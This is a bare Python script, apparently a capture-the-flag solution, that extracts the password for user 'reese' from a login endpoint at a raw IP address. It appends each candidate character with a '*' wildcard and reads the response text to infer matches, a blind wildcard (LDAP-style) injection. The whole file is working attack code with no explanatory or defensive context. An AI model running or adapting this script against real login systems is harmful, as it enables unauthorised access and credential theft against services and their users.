import requests


chars = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0',
'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',' ', '!', '"','#','$', '%', '&','’','(',')', '+',',','-','.','/',',',';','<','=','>','?','@','[','\\','[',
'^','_','`','{','|','}','~',']']


host = 'http://167.99.92.116:30952/login'

payload = {'username':'reese','password':''}

headers = {'User-Agent': 'Mozilla/5.0'}

flag = 1

while flag:
    for char in chars:
        payload['password'] = payload['password'] + char + '*'
        r = requests.post(host,headers=headers,data=payload)
        if "No search results." in r.text:
            print('Worked')
            print(payload)
            payload['password'] = payload['password'][:-1]
            r = requests.post(host,headers=headers,data=payload)
            if "No search results." in r.text:
                flag = 0
            break
        else:
            print("failed")
            print(payload)

            payload['password'] = payload['password'][:-2]
            
            

print(payload)
            



